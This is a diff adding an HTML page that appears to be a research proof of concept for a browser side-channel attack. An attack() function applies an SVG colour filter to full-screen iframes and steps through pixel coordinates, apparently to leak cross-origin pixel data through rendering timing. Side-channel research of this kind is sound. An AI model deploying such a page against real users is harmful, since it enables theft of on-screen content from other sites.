@@ -1,0 +1,51 @@
+
+<html>
+    <body>
+        <svg id=mysvg width="100%" height="100%" shape-rendering="optimizeSpeed">
+        <defs>
+            <filter id="myfilter" color-interpolation-filters ="sRGB"> 
+                <feComponentTransfer in=SourceGraphic result=1>
+                    <feFuncR type = "discrete" tableValues = "0 0.2 0.4 0.9 0.2 0.8 0.5 0.6 0.9 1"></feFuncR>
+                    <feFuncG type = "discrete" tableValues = "0 0.5 0.3 0.8 0.5 1 0.4 0.4 0.3 1"></feFuncG>
+                    <feFuncB type = "discrete" tableValues = "0 0.2 0.4 0.5 0.2 0.3 0.7 0.8 0.9 1"></feFuncB>
+                </feComponentTransfer>
+            </filter>
+        </defs>
+        </svg>
+         <script>
+            function set_attributes(current_iframe, url) {
+                var chosen_style = "position: absolute; top:0; left: 0; width: 100vw; height: 100vh; border: 0;";
+                current_iframe.setAttribute('src', url);
+                current_iframe.setAttribute('style',chosen_style);
+            }
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+            async function attack() {
+                var NumberOfPixels_x = 4;
+                var NumberOfPixels_y = 5;
+                var pixels_per_step = 5;
+                var url_train = "/applayfiltersWithparams.html?filter=hue-rotate&image=half";
+                var ifrm_train = document.createElement('iframe');
+                ifrm_train.setAttribute('id', 'ifrm_train'); // assign an id
+                set_attributes(ifrm_train,url_train);
+                ifrm_train.style.filter = "url(#myfilter)";
+                document.body.appendChild(ifrm_train);
+                await sleep(10000);
+                document.body.removeChild(ifrm_train);
+                for(x=0;x<NumberOfPixels_x;x++){
+                    for(y=0;y<NumberOfPixels_y; y=y+pixels_per_step){
+                        var ifrm_test = document.createElement('iframe');
+                        var url_test = "/applay_animation_on_iframe.html?x_start=" +x.toString() + "&y_start=" + y.toString();
+                        set_attributes(ifrm_test,url_test);
+                        ifrm_test.style.filter = "url(#myfilter)";
+                        document.body.appendChild(ifrm_test);
+                        await sleep(1000); //time in ms
+                        document.body.removeChild(ifrm_test);
+                }
+            }
+        }
+            attack();
+        </script>
+    </body>
+</html>
